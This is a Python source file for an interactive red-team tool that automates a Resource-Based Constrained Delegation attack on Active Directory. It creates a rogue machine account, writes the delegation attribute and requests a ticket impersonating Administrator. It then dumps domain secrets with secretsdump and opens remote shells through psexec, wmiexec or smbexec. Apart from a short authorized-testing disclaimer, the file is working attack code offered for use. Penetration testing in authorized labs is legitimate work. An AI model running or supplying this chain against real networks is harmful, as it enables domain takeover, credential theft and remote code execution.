#!/usr/bin/env python3
"""
RBCD Red Team Simulation Framework 
Works on authorized Active Directory lab environments only

Author  : ASA RBCD ATTACK Tools
Team    : CRAKA10100 / 493nt47 / Mundo
Version : 4.1
Date    : 2026-01-28

DISCLAIMER:
This tool is intended for AUTHORIZED SECURITY TESTING .
Any unauthorized use is illegal.
The authors assume no responsibility for misuse.
"""

import sys
import os
import subprocess
import time
import re
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

def print_banner():
    print(f"""
{Colors.CYAN}{Colors.BOLD}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║     █████╗ ███████╗ █████╗                               ║
    ║    ██╔══██╗██╔════╝██╔══██╗                              ║
    ║    ███████║███████╗███████║                              ║
    ║    ██╔══██║╚════██║██╔══██║                              ║
    ║    ██║  ██║███████║██║  ██║                              ║
    ║    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                              ║
    ║                                                           ║
    ║    {Colors.WHITE}RBCD Attack - Universal Edition v4.1{Colors.CYAN}            ║
    ║    {Colors.YELLOW}Works on ANY Active Directory Lab{Colors.CYAN}               ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.WHITE}[*] Universal RBCD Attack Framework
[*] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Colors.RESET}
""")

def pinfo(msg): print(f"{Colors.BLUE}[i]{Colors.RESET} {msg}")
def psuccess(msg): print(f"{Colors.GREEN}[+]{Colors.RESET} {msg}")
def perror(msg): print(f"{Colors.RED}[-]{Colors.RESET} {msg}")
def pwarn(msg): print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def run_cmd(cmd, show=True, timeout=60):
    """Execute command with optional output display"""
    try:
        if show: pinfo(f"Executing: {cmd}")
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timeout"
    except Exception as e:
        return -1, "", str(e)

def safe_input(prompt, default=None):
    """Safe input with EOFError handling"""
    try:
        result = input(prompt).strip()
        return result if result else default
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Input interrupted")
        if default is not None:
            print(f"{Colors.YELLOW}[i]{Colors.RESET} Using default: {default}")
            return default
        raise

class RBCD:
    def __init__(self, domain, dc_ip, user, pwd, target, atk_name, atk_pwd):
        self.domain = domain.strip()
        self.dc_ip = dc_ip.strip()
        self.user = user.strip()
        self.pwd = pwd.strip()
        self.target = target.strip().upper()
        self.atk_name = atk_name.strip().upper()
        self.atk_pwd = atk_pwd.strip()
        self.ticket = None
        self.prereq_passed = False
    
    def check_tools(self):
        """Verify required tools are installed"""
        print(f"\n{Colors.CYAN}=== Checking Required Tools ==={Colors.RESET}\n")
        
        tools = {
            'impacket-addcomputer': 'impacket-addcomputer -h',
            'impacket-rbcd': 'impacket-rbcd -h',
            'impacket-getST': 'impacket-getST -h',
            'impacket-secretsdump': 'impacket-secretsdump -h',
            'impacket-psexec': 'impacket-psexec -h',
        }
        
        missing = []
        for tool, cmd in tools.items():
            ret = os.system(f"{cmd} > /dev/null 2>&1")
            if ret == 0:
                psuccess(f"{tool} found")
            else:
                perror(f"{tool} NOT found")
                missing.append(tool)
        
        if missing:
            print(f"\n{Colors.RED}Missing tools detected!{Colors.RESET}")
            print(f"{Colors.YELLOW}Install with: pip3 install impacket{Colors.RESET}\n")
            return False
        
        psuccess("All required tools available!")
        return True
    
    def check_connectivity(self):
        """Test network connectivity to DC"""
        print(f"\n{Colors.CYAN}=== Testing Connectivity ==={Colors.RESET}\n")
        
        # Ping test
        pinfo(f"Pinging {self.dc_ip}...")
        ret = os.system(f"ping -c 1 -W 2 {self.dc_ip} > /dev/null 2>&1")
        if ret != 0:
            perror(f"Cannot reach {self.dc_ip}")
            pwarn("Check network connectivity and firewall rules")
            return False
        psuccess(f"DC {self.dc_ip} is reachable")
        
        # Port check
        pinfo("Checking required ports...")
        ports = {'88': 'Kerberos', '389': 'LDAP', '445': 'SMB'}
        for port, service in ports.items():
            ret = os.system(f"nc -zv -w 2 {self.dc_ip} {port} > /dev/null 2>&1")
            if ret == 0:
                psuccess(f"Port {port} ({service}) is open")
            else:
                pwarn(f"Port {port} ({service}) may be filtered")
        
        return True
    
    def check_credentials(self):
        """Verify credentials are valid"""
        print(f"\n{Colors.CYAN}=== Validating Credentials ==={Colors.RESET}\n")
        
        pinfo(f"Testing {self.user}@{self.domain}...")
        cmd = f"crackmapexec smb {self.dc_ip} -u '{self.user}' -p '{self.pwd}' -d {self.domain}"
        ret, out, err = run_cmd(cmd, show=False, timeout=30)
        
        if "STATUS_LOGON_FAILURE" in out or "STATUS_LOGON_FAILURE" in err:
            perror("Invalid credentials!")
            perror("Username or password is incorrect")
            return False
        elif "STATUS_ACCOUNT_LOCKED" in out or "STATUS_ACCOUNT_LOCKED" in err:
            perror("Account is locked!")
            return False
        elif ret == 0 or "Pwn3d!" in out or "[+]" in out:
            psuccess("Credentials are valid!")
            if "Pwn3d!" in out:
                pwarn("User has administrative privileges!")
            return True
        else:
            pwarn("Credential check inconclusive, continuing anyway...")
            return True
    
    def check_maq(self):
        """Check MachineAccountQuota"""
        print(f"\n{Colors.CYAN}=== Checking MachineAccountQuota ==={Colors.RESET}\n")
        
        pinfo("Querying MachineAccountQuota value...")
        cmd = f"crackmapexec ldap {self.dc_ip} -u '{self.user}' -p '{self.pwd}' -d {self.domain} -M maq"
        ret, out, err = run_cmd(cmd, show=False, timeout=30)
        
        # Parse MAQ value
        maq_match = re.search(r'MachineAccountQuota:\s*(\d+)', out)
        if maq_match:
            maq = int(maq_match.group(1))
            if maq > 0:
                psuccess(f"MachineAccountQuota: {maq} (Attack possible!)")
                return True
            else:
                perror(f"MachineAccountQuota: {maq} (Cannot create machine accounts!)")
                pwarn("You need higher privileges or an account with MAQ > 0")
                return False
        else:
            pwarn("Could not determine MachineAccountQuota")
            pwarn("Proceeding anyway, but attack may fail...")
            return True
    
    def check_target(self):
        """Verify target machine exists"""
        print(f"\n{Colors.CYAN}=== Verifying Target ==={Colors.RESET}\n")
        
        pinfo(f"Checking if {self.target}$ exists in domain...")
        cmd = f"crackmapexec smb {self.dc_ip} -u '{self.user}' -p '{self.pwd}' -d {self.domain} --users | grep -i {self.target}"
        ret, out, err = run_cmd(cmd, show=False, timeout=30)
        
        # Try SMB connection
        pinfo(f"Testing SMB connection to {self.target}...")
        cmd = f"crackmapexec smb {self.target} -u '{self.user}' -p '{self.pwd}' -d {self.domain}"
        ret, out, err = run_cmd(cmd, show=False, timeout=30)
        
        if ret == 0 or "[+]" in out:
            psuccess(f"Target {self.target} is accessible")
            return True
        else:
            pwarn(f"Could not verify {self.target}, but continuing...")
            return True
    
    def run_prerequisites(self):
        """Run all prerequisite checks"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'PREREQUISITE CHECKS':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        
        checks = [
            ("Tools Check", self.check_tools),
            ("Connectivity Check", self.check_connectivity),
            ("Credentials Check", self.check_credentials),
            ("MachineAccountQuota Check", self.check_maq),
            ("Target Verification", self.check_target),
        ]
        
        failed = []
        for name, check_func in checks:
            try:
                if not check_func():
                    failed.append(name)
            except Exception as e:
                perror(f"{name} failed with error: {e}")
                failed.append(name)
            time.sleep(0.5)
        
        print(f"\n{Colors.CYAN}=== Prerequisites Summary ==={Colors.RESET}\n")
        if failed:
            pwarn(f"Failed checks: {', '.join(failed)}")
            pwarn("Some checks failed, but you can still try the attack")
            try:
                choice = safe_input(f"\n{Colors.YELLOW}[?]{Colors.RESET} Continue anyway? (yes/no): ", "no")
                if choice.lower() != 'yes':
                    return False
            except (EOFError, KeyboardInterrupt):
                print(f"\n{Colors.YELLOW}[!]{Colors.RESET} Aborted by user")
                return False
        else:
            psuccess("All prerequisite checks passed!")
        
        self.prereq_passed = True
        return True
    
    def dns_setup(self):
        """Configure DNS for the attack"""
        pinfo("Configuring DNS...")
        
        # Backup original resolv.conf
        os.system("cp /etc/resolv.conf /etc/resolv.conf.backup 2>/dev/null")
        
        # Set DNS
        with open('/etc/resolv.conf', 'w') as f:
            f.write(f"nameserver {self.dc_ip}\n")
        
        # Add to hosts
        with open('/etc/hosts', 'a') as f:
            f.write(f"\n{self.dc_ip} {self.domain}\n")
        
        psuccess("DNS configured")
        return True
    
    def create_account(self):
        """Create attacker machine account"""
        pinfo(f"Setting up {self.atk_name}$...")
        
        creds = f"{self.domain}/{self.user}:{self.pwd}"
        base_cmd = f"impacket-addcomputer {creds} -dc-ip {self.dc_ip}"
        
        # Try create
        cmd = f"{base_cmd} -computer-name '{self.atk_name}$' -computer-pass '{self.atk_pwd}'"
        ret, out, err = run_cmd(cmd)
        
        # If exists, try to delete and recreate
        if "already exists" in err or "already exists" in out.lower():
            pwarn(f"{self.atk_name}$ already exists")
            
            try:
                choice = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Delete and recreate? (yes/no): ", "yes")
                if choice.lower() == 'yes':
                    pinfo("Deleting existing account...")
                    del_cmd = f"{base_cmd} -computer-name '{self.atk_name}$' -delete"
                    run_cmd(del_cmd)
                    time.sleep(2)
                    
                    pinfo("Recreating account...")
                    ret, out, err = run_cmd(cmd)
                else:
                    pinfo("Using existing account...")
                    return True
            except (EOFError, KeyboardInterrupt):
                pinfo("Using existing account...")
                return True
        
        if ret == 0 or "Successfully" in out or "Added" in out:
            psuccess(f"{self.atk_name}$ ready with password: {self.atk_pwd}")
            pinfo("Waiting for AD replication (5 seconds)...")
            time.sleep(5)
            return True
        
        perror(f"Failed to create account: {err if err else out}")
        return False
    
    def set_rbcd(self):
        """Configure Resource-Based Constrained Delegation"""
        pinfo(f"Configuring RBCD: {self.atk_name}$ -> {self.target}$")
        
        creds = f"{self.domain}/{self.user}:{self.pwd}"
        cmd = f"impacket-rbcd -delegate-to '{self.target}$' -delegate-from '{self.atk_name}$' -action write '{creds}' -dc-ip {self.dc_ip}"
        ret, out, err = run_cmd(cmd)
        
        if ret == 0 or "successfully" in out.lower() or "can now" in out.lower() or "Attribute" in out:
            psuccess("RBCD configured successfully!")
            time.sleep(2)
            return True
        
        perror(f"RBCD configuration failed: {out}")
        return False
    
    def verify_rbcd(self):
        """Verify RBCD configuration"""
        pinfo("Verifying RBCD configuration...")
        
        cmd = f"impacket-rbcd -delegate-to '{self.target}$' -action read '{self.domain}/{self.user}:{self.pwd}' -dc-ip {self.dc_ip}"
        ret, out, err = run_cmd(cmd)
        
        if self.atk_name in out or self.atk_name.lower() in out.lower():
            psuccess(f"RBCD verified! {self.atk_name}$ can delegate to {self.target}$")
            return True
        
        pwarn("Could not verify RBCD, but continuing...")
        return True
    
    def get_ticket(self):
        """Request service ticket via delegation"""
        pinfo(f"Requesting service ticket for HOST/{self.target}.{self.domain}")
        pinfo("Impersonating Administrator...")
        
        # Try with Administrator first, then Administrateur (French), then custom
        users_to_try = ['Administrator', 'Administrateur']
        
        for admin_user in users_to_try:
            cmd = f"impacket-getST -spn 'HOST/{self.target}.{self.domain}' -impersonate {admin_user} '{self.domain}/{self.atk_name}$:{self.atk_pwd}' -dc-ip {self.dc_ip}"
            ret, out, err = run_cmd(cmd)
            
            if "Saving ticket" in out:
                for line in out.split('\n'):
                    if "Saving ticket" in line:
                        self.ticket = line.split("in ")[1].strip()
                        psuccess(f"✓ Ticket saved: {self.ticket}")
                        os.environ['KRB5CCNAME'] = self.ticket
                        psuccess(f"✓ Ticket exported to environment")
                        return True
            
            if admin_user == users_to_try[0]:
                pinfo(f"Failed with {admin_user}, trying {users_to_try[1]}...")
        
        perror("Ticket request failed!")
        perror(f"Output: {out}")
        if err:
            perror(f"Error: {err}")
        
        pwarn("Try specifying a different admin username manually")
        return False
    
    def dump_secrets(self):
        """Dump domain secrets using the ticket"""
        if not self.ticket:
            perror("No ticket available!")
            return False
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== Dumping Secrets ==={Colors.RESET}\n")
        
        # Export ticket
        psuccess(f"Exporting ticket: {self.ticket}")
        os.environ['KRB5CCNAME'] = self.ticket
        print(f"{Colors.WHITE}$ export KRB5CCNAME={self.ticket}{Colors.RESET}\n")
        
        # Dump secrets
        cmd = f"impacket-secretsdump -k -no-pass {self.target}.{self.domain}"
        psuccess("Executing secretsdump...")
        print(f"{Colors.WHITE}$ {cmd}{Colors.RESET}\n")
        os.system(cmd)
        
        print(f"\n{Colors.GREEN}[✓]{Colors.RESET} Secrets dump completed!")
        return True
    
    def get_shell(self):
        """Get interactive shell on target"""
        if not self.ticket:
            perror("No ticket available!")
            return False
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== Getting Shell ==={Colors.RESET}\n")
        
        # Export ticket
        psuccess(f"Exporting ticket: {self.ticket}")
        os.environ['KRB5CCNAME'] = self.ticket
        print(f"{Colors.WHITE}$ export KRB5CCNAME={self.ticket}{Colors.RESET}\n")
        
        print(f"{Colors.YELLOW}Choose shell method:{Colors.RESET}")
        print(f"1. PSExec (default)")
        print(f"2. WMIExec")
        print(f"3. SMBExec")
        
        try:
            choice = safe_input(f"\n{Colors.YELLOW}[?]{Colors.RESET} Method [1]: ", "1")
        except (EOFError, KeyboardInterrupt):
            choice = "1"
        
        methods = {
            '1': 'impacket-psexec',
            '2': 'impacket-wmiexec',
            '3': 'impacket-smbexec'
        }
        
        tool = methods.get(choice, 'impacket-psexec')
        cmd = f"{tool} -k -no-pass {self.target}.{self.domain}"
        
        psuccess(f"Launching {tool}...")
        print(f"{Colors.WHITE}$ {cmd}{Colors.RESET}\n")
        os.system(cmd)
        
        print(f"\n{Colors.GREEN}[✓]{Colors.RESET} Shell session ended")
        return True
    
    def run_attack(self):
        """Execute the complete RBCD attack chain"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'ATTACK EXECUTION':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*60}{Colors.RESET}\n")
        
        steps = [
            ("DNS Setup", self.dns_setup),
            ("Account Setup", self.create_account),
            ("RBCD Configuration", self.set_rbcd),
            ("RBCD Verification", self.verify_rbcd),
            ("Ticket Acquisition", self.get_ticket),
        ]
        
        for name, func in steps:
            print(f"\n{Colors.YELLOW}>>> {name}{Colors.RESET}")
            if not func():
                perror(f"✗ Failed at: {name}")
                print(f"\n{Colors.RED}{Colors.BOLD}=== ATTACK FAILED ==={Colors.RESET}\n")
                self.cleanup()
                return False
            time.sleep(1)
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════╗")
        print(f"║                                      ║")
        print(f"║        ATTACK SUCCESSFUL! ✓          ║")
        print(f"║                                      ║")
        print(f"╚══════════════════════════════════════╝{Colors.RESET}\n")
        
        return True
    
    def cleanup(self):
        """Restore DNS configuration"""
        pinfo("Restoring DNS configuration...")
        os.system("mv /etc/resolv.conf.backup /etc/resolv.conf 2>/dev/null")
        psuccess("Cleanup complete")
    
    def show_manual_commands(self):
        """Display manual post-exploitation commands"""
        if not self.ticket:
            return
        
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{'MANUAL POST-EXPLOITATION COMMANDS':^60}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"{Colors.WHITE}Ticket File:{Colors.RESET} {self.ticket}\n")
        print(f"{Colors.WHITE}Export ticket:{Colors.RESET}")
        print(f"  export KRB5CCNAME={self.ticket}\n")
        print(f"{Colors.WHITE}Dump secrets:{Colors.RESET}")
        print(f"  impacket-secretsdump -k -no-pass {self.target}.{self.domain}")
        print(f"  impacket-secretsdump -k -no-pass {self.target}.{self.domain} -just-dc-ntlm\n")
        print(f"{Colors.WHITE}Get shell:{Colors.RESET}")
        print(f"  impacket-psexec -k -no-pass {self.target}.{self.domain}")
        print(f"  impacket-wmiexec -k -no-pass {self.target}.{self.domain}")
        print(f"  impacket-smbexec -k -no-pass {self.target}.{self.domain}")
        print(f"  impacket-atexec -k -no-pass {self.target}.{self.domain} whoami\n")
        print(f"{Colors.WHITE}Other actions:{Colors.RESET}")
        print(f"  impacket-smbclient -k -no-pass {self.target}.{self.domain}")
        print(f"  impacket-reg -k -no-pass {self.target}.{self.domain} query -keyName HKLM\\\\SOFTWARE\n")
        
        print(f"{Colors.YELLOW}💡 Tip: You can use 'dump', 'shell', or 'both' in the next prompt{Colors.RESET}\n")

def get_config():
    """Interactive configuration gathering"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}{'CONFIGURATION':^60}{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    domain = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Domain (e.g., ADATUM.com): ", "")
    dc_ip = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} DC IP Address: ", "")
    user = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Username: ", "")
    pwd = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Password: ", "")
    target = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Target Machine: ", "")
    atk = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Attacker Machine Name [EVILPC]: ", "EVILPC")
    atk_pwd = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Attacker Password [EvilPass123!]: ", "EvilPass123!")
    
    return domain, dc_ip, user, pwd, target, atk, atk_pwd

def main():
    try:
        # Check root
        if os.geteuid() != 0:
            perror("This script must be run as root!")
            perror("Please run: sudo python3 asa_rbcd02.py")
            sys.exit(1)
        
        print_banner()
        pwarn("AUTHORIZED PENETRATION TESTING ONLY!")
        pwarn("Unauthorized access to computer systems is illegal.\n")
        
        print(f"\n{Colors.CYAN}=== Menu ==={Colors.RESET}\n")
        print(f"1. Full Attack (with prerequisites check)")
        print(f"2. Full Attack (skip prerequisites)")
        print(f"3. Dump Only (existing ticket)")
        print(f"4. Shell Only (existing ticket)")
        print(f"5. Dump + Shell (existing ticket)")
        print(f"6. Prerequisites Check Only")
        print(f"7. Exit")
        
        choice = safe_input(f"\n{Colors.YELLOW}[?]{Colors.RESET} Select option: ", "1")
        
        if choice in ['1', '2', '6']:
            cfg = get_config()
            rbcd = RBCD(*cfg)
            
            print(f"\n{Colors.CYAN}Configuration Summary:{Colors.RESET}")
            print(f"  Domain:   {rbcd.domain}")
            print(f"  DC:       {rbcd.dc_ip}")
            print(f"  User:     {rbcd.user}")
            print(f"  Target:   {rbcd.target}$")
            print(f"  Attacker: {rbcd.atk_name}$")
            
            confirm = safe_input(f"\n{Colors.YELLOW}[?]{Colors.RESET} Continue with this configuration? (yes/no): ", "yes")
            if confirm.lower() != 'yes':
                psuccess("Aborted by user")
                sys.exit(0)
            
            # Run prerequisites if requested
            if choice in ['1', '6']:
                if not rbcd.run_prerequisites():
                    perror("Prerequisites check failed!")
                    sys.exit(1)
                
                if choice == '6':
                    psuccess("Prerequisites check complete!")
                    sys.exit(0)
            
            # Run attack
            if rbcd.run_attack():
                rbcd.show_manual_commands()
                
                try:
                    action = safe_input(f"\n{Colors.YELLOW}[?]{Colors.RESET} Action (dump/shell/both/exit): ", "exit")
                    
                    if action.lower() == 'dump':
                        rbcd.dump_secrets()
                    elif action.lower() == 'shell':
                        rbcd.get_shell()
                    elif action.lower() == 'both':
                        rbcd.dump_secrets()
                        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}\n")
                        rbcd.get_shell()
                    else:
                        psuccess("Attack completed successfully!")
                        
                except (EOFError, KeyboardInterrupt):
                    print(f"\n{Colors.GREEN}[✓]{Colors.RESET} Attack completed successfully!")
                
                rbcd.cleanup()
        
        elif choice == '3':
            ticket = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Ticket file path: ", "")
            if not os.path.exists(ticket):
                perror(f"Ticket file not found: {ticket}")
                sys.exit(1)
            
            cfg = get_config()
            rbcd = RBCD(*cfg)
            rbcd.ticket = ticket
            rbcd.dump_secrets()
        
        elif choice == '4':
            ticket = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Ticket file path: ", "")
            if not os.path.exists(ticket):
                perror(f"Ticket file not found: {ticket}")
                sys.exit(1)
            
            cfg = get_config()
            rbcd = RBCD(*cfg)
            rbcd.ticket = ticket
            rbcd.get_shell()
        
        elif choice == '5':
            ticket = safe_input(f"{Colors.YELLOW}[?]{Colors.RESET} Ticket file path: ", "")
            if not os.path.exists(ticket):
                perror(f"Ticket file not found: {ticket}")
                sys.exit(1)
            
            cfg = get_config()
            rbcd = RBCD(*cfg)
            rbcd.ticket = ticket
            rbcd.dump_secrets()
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}\n")
            rbcd.get_shell()
        
        else:
            psuccess("Goodbye!")
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!]{Colors.RESET} Interrupted by user")
        psuccess("Exiting gracefully...")
        sys.exit(0)
    except EOFError:
        print(f"\n\n{Colors.GREEN}[✓]{Colors.RESET} Script completed")
        sys.exit(0)
    except Exception as e:
        perror(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
